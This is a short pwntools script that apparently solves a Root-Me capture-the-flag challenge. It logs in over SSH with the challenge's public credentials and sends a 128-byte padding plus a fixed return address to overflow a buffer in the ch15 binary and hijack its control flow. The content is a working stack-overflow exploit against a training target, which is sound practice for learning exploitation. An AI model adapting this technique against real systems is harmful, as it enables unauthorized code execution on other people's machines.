from pwn import *

s = ssh(host='challenge02.root-me.org',user='app-systeme-ch15',password='app-systeme-ch15',port=2222)

p = s.process('./ch15')

target = p32(0x08048516)
buf_size = 128

payload = b'A' * buf_size + target

p.send(payload)

p.interactive()
